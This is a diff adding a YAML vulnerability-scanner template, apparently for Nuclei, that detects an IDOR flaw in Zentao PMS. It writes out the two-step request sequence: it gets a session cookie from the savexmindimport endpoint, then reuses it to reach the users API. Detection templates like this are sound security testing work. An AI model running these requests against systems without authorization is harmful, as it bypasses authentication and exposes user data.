@@ -1,0 +1,36 @@
+id: easycorp-zentao-pms-idor-ct-1222946
+info:
+  name: Zentao PMS IDOR Vulnerability
+  author: yuxiang.cai
+  severity: critical
+  description: |
+    This template detects an IDOR vulnerability in Zentao PMS by utilizing two HTTP requests. The first request saves an import and retrieves a session cookie, and the second request verifies access to user data using the obtained cookie.
+
+variables:
+  random_str_0: "{{rand_text_alphanumeric(20)}}"
+  random_str_1: "{{rand_text_alphanumeric(20)}}"
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{random_str_0}}&branch={{random_str_1}}"
+    redirects: true
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        regex:
+          - "zentaosid=([a-zA-Z0-9]+)"
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/api.php/v1/users"
+    headers:
+      Cookie: "zentaosid={{cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "no company-browse priv"
